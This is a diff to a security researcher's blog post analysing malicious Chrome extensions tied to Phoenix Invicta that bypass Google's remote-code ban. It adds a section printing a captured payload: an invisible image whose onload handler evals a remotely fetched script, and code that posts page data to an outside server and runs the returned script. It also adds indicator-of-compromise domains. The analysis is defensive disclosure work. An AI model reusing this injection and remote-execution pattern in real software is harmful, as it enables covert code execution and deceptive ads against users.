@@ -8,7 +8,7 @@ description: This blog post looks into how 62 malicious extensions circumvent Go
   restrictions of remote code execution in extensions. One group of extensions is
   associated with the company Phoenix Invicta, another with Technosense Media. The
   largest group around Sweet VPN hasn’t been attributed yet.
-lastmod: '2025-01-20 14:37:55'
+lastmod: '2025-01-21T01:36:55+0100'
 title: Malicious extensions circumvent Google’s remote code ban
 ---
 
@@ -19,6 +19,8 @@ As with most things about Manifest V3, these changes are meant for well-behaving
 {{< img src="remote_code.png" width="649" alt="Screenshot of a Google webpage titled “Deal with remote hosted code violations.” The page text visible in the screenshot says: Remotely hosted code, or RHC, is what the Chrome Web Store calls anything that is executed by the browser that is loaded from someplace other than the extension's own files. Things like JavaScript and WASM. It does not include data or things like JSON or CSS." />}}
 
 **Update** (2025-01-20): Added two extensions to the bonus section. Also indicated in the tables which extensions are currently featured in Chrome Web Store.
+
+**Update** (2025-01-21): Got a sample of the malicious configurations for Phoenix Invicta extensions. Added a section describing it and removed “But what do these configurations actually do” section.
 
 {{< toc >}}
 
@@ -146,6 +148,69 @@ There are many extensions similar to Volume Booster. The general approach seems 
 4. Feed another part of the configuration to `declarativeNetRequest` API. Alternatively (or additionally), use static rules in the extension that will remove pesky security headers from all websites, nobody will ask why you need that.
 
 Not all extensions implement all of these points. With some of the extensions the malicious functionality seems incomplete. I assume that it isn’t being added all at once, instead the support for malicious configurations is added slowly to avoid raising suspicions. And maybe for some extensions the current state is considered “good enough,” so nothing is to come here any more.
+
+### The payload
+
+After I already published this article I finally got a sample of the malicious “shortcut” value, to be applied on all websites. Unsurprisingly, it had the form:
+
+```html
+<img height="1" width="1" src="data:image/gif;base64,…"
+     onload="(() => {…})();this.remove()">
+```
+
+This injects an invisible image into the page, runs some JavaScript code via its `load` event handler and removes the image again. The JavaScript code consists of two code blocks. The first block goes like this:
+
+```js
+if (isGoogle() || isFrame()) {
+    hideIt();
+    const script = yield loadScript();
+    if (script) {
+        window.eval.call(window, script);
+        window.gsrpdt = 1;
+        window.gsrpdta = '_new'
+    }
+}
+```
+
+The `isGoogle` function looks for a Google subdomain and a query – this is about search pages. The `isFrame` function looks for frames but excludes “our frames” which include the strings `q=`, `frmid` and `gsc.page` in the address. The `loadScript` function fetches a script from `https://shurkul[.]online/v1712/g1001.js`. This script then injects a hidden frame into the page, loaded either from `kralforum.com.tr` (Edge) or `rumorpix.com` (other browsers). There is also some tracking to an endpoint on `dev.astralink.click` but the main logic operating the frame is in the other code block.
+
+The second code block looks like this (somewhat simplified for readability):
+
+```js
+if (window.top == window.self) {
+    let response = await fetch('https://everyview.info/c', {
+        method: 'POST',
+        body: btoa(unescape(encodeURIComponent(JSON.stringify({
+            u: 'm5zthzwa3mimyyaq6e9',
+            e: 'ojkoofedgcdebdnajjeodlooojdphnlj',
+            d: document.location.hostname,
+            t: document.title,
+            'iso': 4
+        })))),
+        headers: {
+            'Content-Type': 'text/plain'
+        },
+        credentials: 'include'
+    });
+    let text = await response.text();
+    runScript(decodeURIComponent(escape(atob(text))));
+} else {
+    window.addEventListener('message', function(event) {
+        event && event.data && event.data.boosterWorker &&
+            event.data.booster && runScript(event.data.booster);
+    });
+}
+```
+
+So for top-level documents this downloads some script from `everview.info` and runs it. That script in turn injects another script from `lottingem.com`. And that script loads some ads from `gulkayak.com` or `topodat.info` as well as Google ads, makes sure these are displayed in the frame and positions the frame above the search results. The result are ads which can be barely distinguished from actual search results, here is what I get searching for “amazon” for example:
+
+{{< img src="ad_frame.png" width="575" alt="Screenshot of what looks like Google search results, e.g. a link titled “Amazon Produkte - -5% auf alle Produkte”. The website mentioned above it is conrad.de however rather than amazon.de." />}}
+
+The second code block also has some additional tracking going to `doubleview.online`, `astato.online`, `doublestat.info`, `triplestat.online` domains.
+
+The payloads I got for the Manual Finder 2024 and Manuals Viewer extensions are similar but not identical. In particular, these use `fivem.com.tr` domain for the frame. But the result is essentially the same: ads that are almost impossible to distinguish from the search results. In this screenshot the link at the bottom is a search result, the one above it is an ad:
+
+{{< img src="ad_frame2.png" width="617" alt="Screenshot of search results. Above a link titled “Amazon - Import US to Germany” with the domain myus.com. Below an actual Amazon.de link. Both have exactly the same visuals." />}}
 
 ### Who is behind these extensions?
 
@@ -397,14 +462,6 @@ Translator makes it look like its configuration is all about downloading a list 
 | Download Manager Integration Checklist | 70,000 | ghkcpcihdonjljjddkmjccibagkjohpi | ✓ |
 | Translator | 100,000 | icchadngbpkcegnabnabhkjkfkfflmpj |
 
-## But what do these “configurations” actually do?
-
-You may be wondering why I am only speculating about what these extensions *could* do instead of saying what they actually do. And that’s because all the “configurations” I’ve seen were either empty or meaningless. That’s exactly what makes remote code so problematic in reviews.
-
-The servers of these extensions produce a benign “configuration” for me, but that most likely isn’t the case for everybody. That’s why the extensions give the server a unique user ID and sometimes also usage statistics. This allows the server to decide whether to deliver a benign or a malicious configuration to this particular user.
-
-Typically, the malicious response will only be produced once people have been using the extension for a while – typically a few weeks. This will make sure that the malicious functionality cannot be seen by your typical security researcher who just installed the extension. It also makes sure that users can no longer associate installing the extension with ads suddenly popping up everywhere.
-
 ## IOCs
 
 The following domain names are associated with Phoenix Invicta:
@@ -415,6 +472,7 @@ The following domain names are associated with Phoenix Invicta:
 * anysearch[.]guru
 * anysearchnow[.]info
 * astatic[.]site
+* astato[.]online
 * astralink[.]click
 * best-browser-extensions[.]com
 * better-color-picker[.]guru
@@ -436,6 +494,7 @@ The following domain names are associated with Phoenix Invicta:
 * fasterbrowser[.]online
 * fastertabs[.]online
 * findmanual[.]org
+* fivem[.]com[.]tr
 * fixfind[.]online
 * font-expert[.]pro
 * freestikers[.]top
@@ -444,20 +503,25 @@ The following domain names are associated with Phoenix Invicta:
 * get-manual[.]info
 * getresult[.]guru
 * good-ship[.]com
+* gulkayak[.]com
 * isstillalive[.]com
+* kralforum[.]com[.]tr
 * locodata[.]site
 * lottingem[.]com
 * manual-finder[.]site
 * manuals-viewer[.]info
 * megaboost[.]site
 * nocodata[.]online
+* ntdataview.online
 * picky-ext[.]pro
 * pocodata[.]pro
 * readtxt[.]pro
+* rumorpix[.]com
 * screencapx[.]co
 * searchglobal[.]online
 * search-protection[.]org
 * searchresultspage[.]online
+* shurkul[.]online
 * skipadsplus[.]online
 * skip-all-ads[.]info
 * skip-n-watch[.]info
@@ -471,6 +535,7 @@ The following domain names are associated with Phoenix Invicta:
 * tabmemoptimizer[.]site
 * taboptimizer[.]com
 * text-speecher[.]online
+* topodat[.]info
 * true-sound-booster[.]online
 * ufind[.]site
 * video-downloader-click-save[.]online
